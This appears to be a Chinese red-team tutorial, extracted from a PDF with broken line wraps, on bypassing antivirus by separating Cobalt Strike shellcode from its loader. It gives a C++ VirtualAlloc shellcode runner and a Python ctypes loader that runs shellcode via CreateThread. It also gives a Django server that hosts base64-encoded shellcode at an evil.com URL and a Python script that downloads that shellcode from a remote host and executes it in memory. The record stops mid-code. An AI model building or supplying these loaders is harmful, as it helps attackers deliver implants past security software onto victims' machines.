利⽤加载器以及 反
Python
序列化绕过 酒仙桥六
AV_
号部队
- MdEditor
“ 利⽤加载器以及 Python 反序列化绕过
AV
前⾔
在⽇常红队⾏动中，为了利⽤⽬前现有的资源尝试获取更
多的凭据以及更⾼的权限，我们通常需要先获得⼀台主机
作为突破⼝，并将其作为跳板进⾏横向渗透。但是内⽹中
⼀般部署有防⽕墙、流量监控等设备，杀软更是成为了服
务器的标配，所以如何进⾏免杀绕过杀软的限制让主机上
线成了我们⾸要解决的问题之⼀。⽬前免杀技术⼤致分为
以下⼏类:
1. 特征码修改
2. 花指令免杀
3. 加壳免杀
4. 内存免杀
5. ⼆次编译
6. 分离免杀
7. 资源修改
8. ...
本⽂仅以分离免杀为例，利⽤ 语⾔制作加载器
Python
对 ⽣成的 进⾏绕过杀软作为
Cobaltstrike Shellcode
样例，举例说明通过加密 、分离免杀以及
Shellcode
反序列化达到 的思路和⽅法。仅针对
Python bypass
现有公开技术进⾏研究学习，⽅便安全⼈员对授权项⽬完
成测试⼯作和学习交流使⽤，请使⽤者遵守当地相关法
律，勿⽤于⾮授权测试。
Shellcode
在我们进⾏漏洞利⽤的过程中，必不可少的部分就是
（⼀段⽤于利⽤软件漏洞⽽执⾏的代码）。
shellcode
攻击者可以通过这段代码打开系统的 ，以执⾏任
shell
意的操作系统命令——⽐如下载病毒，安装⽊⻢，开放端
⼝，格式化磁盘等恶意操作。本⽂重点是对加载器相应思
路进⾏介绍，因此不对 的编写与提取等相关
Shellcode
技术进⾏展开，为⽅便使⽤，我们以 ⽣
Cobalt Strike
成的 为例，后⽂不在赘述。
Shellcode
加载 Shellcode 原理
加载 的⽅式有很多，例如函数指针执⾏、内
Shellcode
联汇编指令、伪指令等。⼤部分脚本语⾔加载
都是通过 的 去调⽤操作系统的
Shellcode c ffi
，如果我们了解了 是怎么加载 的
api C Shellcode
原理，使⽤时只需要查询⼀下对应语⾔的调⽤⽅式即可。
⾸先我们要明⽩， 是⼀串可执⾏的⼆进制代
Shellcode
码，那么我们想利⽤它就可以先通过其他的⽅法来开辟⼀
段具有读写和执⾏权限的区域；然后将我们的
放进去，之后跳转到 的⾸地址
Shellcode Shellcode
去执⾏就可以了，利⽤这个思路我们可以先写⼀个
C++
的版本，还是像上⽂⼀样⽣成 这⾥我们利
Shellcode。
⽤ ⽣成 位的 ，正常使
CobaltStrike 32 Shellcode
⽤像 内存操作的函数执⾏
VirtualAlloc Shellcode
#include "windows.h"
using namespace std;
int main(int argc, char **argv)
{
unsigned char buf[] = "\xfc\xe8\x89\x00\x00\x00\x60\x8
void *exec = VirtualAlloc(0, sizeof buf, MEM_COMMI
memcpy(exec, buf, sizeof buf);
((void(*)())exec)();
return 0;
}
我们编译并运⾏可以正常上线，并且可以正常执⾏命令。
Shellcode 分离
我们可以利⽤⽕绒扫描⼀下我们上⾯编译好的可执⾏程
序。
我们发现这种将 与程序绑定的⽅式很容易被
Shellcode
杀软查杀，我们可以测试⼀下先将 去除，仅
Shellcode
留下程序代码，再进⾏扫描。
#include "windows.h"
using namespace std;
int main(int argc, char** argv)
{
unsigned char buf[] = "";
void* exec = VirtualAlloc(0, sizeof buf, MEM_COMMI
memcpy(exec, buf, sizeof buf);
((void(*)())exec)();
return 0;
}
此时由于我们已经将带有特征值的 去除，所
Shellcode
以在杀软视⻆看来，这已经是⼀段正常的程序，因此就不
会触发相应的告警，因此，如果我们可以将
Shellcode
和加载程序分离，将 单独存放在某个地⽅，
Shellcode
再由程序进⾏请求获得，我们也就在⼀定程序上绕过了杀
软的检测。
Python 加载 Shellcode
再了解了上述加载 的原理之后，我们就可以
Shellcode
利⽤ 中的 库实现这⼀过程，
Python3 ctypes
是 的外部函数库。它提供了与 语
ctypes Python C
⾔兼容的数据类型，并允许调⽤ 或共享库中的函
DLL
数。可使⽤该模块以纯 形式对这些库进⾏封
Python
装，我们⾸先利⽤ ⽣成 位的
CobaltStrike 64
进⾏测试，之后利⽤ 加载
Shellcode Python
代码如下：
Shellcode
import ctypes
shellcode = b""
shellcode += b"\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x0
shellcode = bytearray(shellcode)
# 设置VirtualAlloc返回类型为ctypes.c_uint64
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c
# 申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int
# 放⼊shellcode
buf = (ctypes.c_char * len(shellcode)).from_buffer(she
ctypes.windll.kernel32.RtlMoveMemory(
ctypes.c_uint64(ptr),
buf,
ctypes.c_int(len(shellcode))
)
# 创建⼀个线程从shellcode防⽌位置⾸地址开始执⾏
handle = ctypes.windll.kernel32.CreateThread(
ctypes.c_int(0),
ctypes.c_int(0),
ctypes.c_uint64(ptr),
ctypes.c_int(0),
ctypes.c_int(0),
ctypes.pointer(ctypes.c_int(0))
)
# 等待上⾯创建的线程运⾏完
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_in
之后我们直接运⾏这个 脚本即可加载我们利⽤
Python
⽣成的 ，实现上线功能并可
CobaltStrike Shellcode
以正常执⾏命令。
利⽤加载器实现 Shellcode 分离
上⽂我们说过了，我们想绕过杀软的检测，我们可以利⽤
分离 和加载程序的⽅法，这种⽅法就是加载
Shellcode
器的⽅法。整体流程是将我们的 与程序进⾏
Shellcode
分离，⽽上传到⽬标的可执⾏程序仅作为⼀个类似于下载
器的程序使⽤，例如我们可以搭建⼀个 ，
Http Server
之后构造我们的 ⻚⾯，再由本地加载器访问
Shellcode
⻚⾯地址，获取⻚⾯的 内容，之后加载并执
Shellcode
⾏，流程类似于下图。
HttpServer
⾸先我们需要构造我们的 ，我们这⾥利⽤
HttpServer
实现这⼀过程。我们整体⼤致流程就是我们通
Django
过⼀个前端⻚⾯将我们 ⽣成的
CobaltStrike
保存到数据库中， 后端利⽤
Shellcode Django UUID
⽣成⼀个基于时间戳的随机字符串，并且保存到
字段中，之后我们再构造⼀个 读
hash_md5 Shellcode
取的⻚⾯，该⻚⾯根据 中的 去查询数
URL hash_md5
据库中对应的 并且展示到该⻚⾯上，例如我
Shellcode
们再数据库中有如下数据。
我们访问如下链接即可查看我们保存的
Shellcode
http://evil.com/shellcode/9adef1ca-151b-11eb-
b767-5c80b6fea32f
Models
⾸先我们定义如下数据模型。
class Shellcode(models.Model):
id = models.AutoField(primary_key=True)
hash_md5 = models.CharField(max_length = 200)
shellcode = models.TextField()
pub_date = models.DateTimeField(default=timezone.n
class Meta:
ordering = ('-pub_date',)
def __str__(self):
return self.shellcode
字段含义如下：
字段名称 备注
id ⾃增主键 ID
利⽤ UUID ⽣成的随机 字符串，⽅便
hash_md5
后续进⾏ URL ⽣成
shellcode shellcode 内容
pub_date ⽣成时间
Views
def showshellcode(request, hash_md5):
shellcode = Shellcode.objects.get(hash_md5 = hash_
try:
if shellcode != None:
return render(request, 'shellcode.html', l
except:
return redirect('/')
Urls
from django.contrib import admin
from django.urls import path
from auto_antiav_app.views import homepage,showshellco
urlpatterns = [
path('admin/', admin.site.urls),
path('', homepage),
path('shellcode/', showshellcode),
]
这样我们就可以通过控制 中的 后⾯
URL shellcode/
的部分，也就是 来调⽤不同的
shellcode Shellcode
了，⽽且由于我们 是由⾃⼰放置在我们的
Shellcode
上，我们也可以进⾏进⼀步处理。⽐如对
HttpServer
进⾏混淆编码加密，再有本地可执⾏程序进
Shellcode
⾏解密执⾏，这⾥我们以 编码处理为例，处理
Base64
过后 ⻚⾯如下。
Shellcode
当然我们也可以将我们的 隐藏在图⽚等载体
Shellcode
中。
下载 Shellcode 并加载执⾏
当我们构建好 后，我们就可以通过
HttpServer
中的 访问我们的
Python urllib.request HttpServer
对 进⾏获取，由于我们上⽂对
Shellcode Shellcode
进⾏了 编码处理，所以我们本地获取到后
base64
后在进⾏解码即可。
Shellcode
import ctypes,urllib.request,base64,codecs,pickle
shellcode = urllib.request.urlopen('http://192.168.177
shellcode = base64.b64decode(shellcode)
shellcode =codecs.escape_decode(shellcode)[0]
shellcode = bytearray(shellcode)
# 设置VirtualAlloc返回类型为ctypes.c_uint64
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c
# 申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int
# 放⼊shellcode
buf = (ctypes.c_char * len(shellcode)).from_buffer(she
ctypes.windll.kernel32.RtlMoveMemory(
ctypes.c_uint64(ptr),
buf,
ctypes.c_int(len(shellcode))
)
handle = ctypes.windll.kernel32.CreateThread(
ctypes.c_int(0),
ctypes.c_int(0),
ctypes.c_uint64(ptr),